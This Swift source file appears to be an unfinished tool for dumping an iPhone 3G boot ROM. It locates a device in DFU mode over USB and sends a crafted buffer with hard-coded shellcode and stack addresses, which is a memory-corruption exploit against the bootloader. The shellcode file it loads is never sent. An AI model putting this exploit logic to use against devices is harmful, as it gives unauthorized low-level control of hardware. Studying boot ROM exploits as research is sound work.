//
//  main.swift
//  BootRom Dumper Swift
//
//  Created by Sean Deaton on 3/12/25.
//

import os
import Foundation
import IOKit
import IOKit.usb
import BootRomDumperFramework

private let log = Logger()

/* Check if a device is connected. */
func getiPhoneDevice() -> io_object_t {
    var matchingDict: CFMutableDictionary?
    matchingDict = IOServiceMatching(kIOUSBDeviceClassName)
    if (matchingDict == nil) {
        log.error("Couldn't create matching dictionary: \(String(describing: matchingDict))")
        return IO_OBJECT_NULL
    }
    
    var iter: io_iterator_t = 0
    let kr: kern_return_t = IOServiceGetMatchingServices(kIOMainPortDefault, matchingDict!, &iter)
    
    if (kr != kIOReturnSuccess) {
        log.error("Couldn't iterate over matching services: \(kr)")
        return IO_OBJECT_NULL
    }
    while case let device = IOIteratorNext(iter), device != IO_OBJECT_NULL {
        if device.isIPhone() || device.isInRecoveryMode() || device.isInDFUMode() {
            return device
        }
        log.info("Found device with productID \(String(describing: device.productID())), skipping...")
        IOObjectRelease(device)
        continue
    }
    return IO_OBJECT_NULL
}


func main() -> Int32 {
    /* Get the iPhone, if one exists. */
    let device = getiPhoneDevice()
    if device != IO_OBJECT_NULL {
        log.info("[+] Found iPhone")
    } else {
        log.info("[-] No iPhone found.")
        return EXIT_FAILURE
    }
    /* Get the productID (this is the model number). */
    guard let productID = device.productID() else {
        log.error("[-] Error getting the device productID.")
        return EXIT_FAILURE
    }
    log.info("[+] Product ID: \(String(format: "0x%04X", productID.intValue))")
    /* Convert the model number to a model string (iPhone1,2, etc.). */
    guard let model = productIDToModel[Int(truncating: productID)] else {
        log.error("Unknown device model number.")
        return EXIT_FAILURE
    }
    /* Convert the model number to the actual product name (iPhone 3G, etc). */
    if let productName = modelToProductName[model] {
        log.info("[+] Product name: \(productName) (\(model))")
    } else {
        log.info("[*] Unknown product name for model number: \(model).")
    }
    
    if !device.isInDFUMode() {
        log.error("[-] Device is not in DFU mode, exiting.")
        return EXIT_FAILURE
    }
    log.info("[+] Found device in DFU mode, continuing...")
    
    /* These are specific to the iPhone 3G. */
    let LOADADDR: UInt32 = 0x84000000
    let LOADADDR_SIZE: UInt32 = 0x24000
    let EXPLOIT_LR: UInt32 = 0x84033F98
    
    let shellcodeAddress = LOADADDR + LOADADDR_SIZE - 0x1000 + 1
    let stackAddress = EXPLOIT_LR
    let transferLength = 0x800
    var buf = [UInt8](repeating: 0, count: transferLength)

    /* Get the plugin interface. */
    var pluginInterfacePtrPtr: UnsafeMutablePointer<UnsafeMutablePointer<IOCFPlugInInterface>?>? = device.pluginInterface()
    guard pluginInterfacePtrPtr != nil, let pluginInterfacePtr = pluginInterfacePtrPtr?.pointee else {
        log.error("Could not get plugin interface pointee, exiting.")
        return EXIT_FAILURE
    }
    log.info("[+] Got plugin interface, continuing...")
    let pluginInterface = pluginInterfacePtr.pointee
    
    /* Get the device interface. */
    var deviceInterfacePtrPtr: UnsafeMutablePointer<UnsafeMutablePointer<IOUSBDeviceInterface>?>? = nil
    let queryResult = withUnsafeMutablePointer(to: &deviceInterfacePtrPtr) {
        $0.withMemoryRebound(to: Optional<LPVOID>.self, capacity: 1) { rawPtr in
            pluginInterface.QueryInterface(pluginInterfacePtrPtr, CFUUIDGetUUIDBytes(kIOUSBDeviceInterfaceID), rawPtr)
        }
    }
    guard queryResult == kIOReturnSuccess, let deviceInterface = deviceInterfacePtrPtr?.pointee?.pointee else {
        fatalError("Unable to get device interface")
    }
    log.info("[+] Obtained device interface.")
    
    buf.withUnsafeMutableBytes { rawBuffer in
        rawBuffer.initializeMemory(as: UInt8.self, repeating: 0xCC)
    }
    
    buf.withUnsafeMutableBytes { rawBuffer in
        // Bind the memory to UInt32 so we can treat it as an array of UInt32.
        let uint32Ptr = rawBuffer.bindMemory(to: UInt32.self)
        // Iterate over every 0x40-byte block (0x40 / 4 = 16 UInt32 entries per block).
        for offset in stride(from: 0, to: transferLength, by: 0x40) {
            // Calculate the index into the UInt32 array.
            let index = offset / MemoryLayout<UInt32>.size
            uint32Ptr[index + 0] = 0x405
            uint32Ptr[index + 1] = 0x101
            uint32Ptr[index + 2] = shellcodeAddress
            uint32Ptr[index + 3] = stackAddress
        }
    }
    
    // Now create an IOUSBDevRequest to send the data.
    // (Note: IOKit’s DeviceRequest is synchronous and does not support a timeout parameter.)
    var request = IOUSBDevRequest(
        bmRequestType: 0x21,  // Host-to-device, Class, Interface
        bRequest: 1,          // Request code (as in your C code)
        wValue: 0,
        wIndex: 0,
        wLength: UInt16(transferLength),
        pData: buf.withUnsafeMutableBytes { $0.baseAddress }, // pointer to our buffer
        wLenDone: 0
    )
    
    let kr = deviceInterface.DeviceRequest(deviceInterfacePtrPtr, &request)
    if kr != kIOReturnSuccess {
        log.error("Unable to send the request, returned \(kr).")
    } else {
        log.info("[+] Sent data to copy")
    }
    
    /* Read the shellcode. */
    let fileURL = URL(fileURLWithPath: "./Sources/Payload/payload.o")
    do {
        let fileData = try Data(contentsOf: fileURL)
        log.info("Read \(fileData.count) bytes from \(fileURL.path)")
        let shellcode = [UInt8](fileData)
    } catch {
        print("Error reading file: \(error)")
        return EXIT_FAILURE
    }
    
    return EXIT_SUCCESS
}

main()
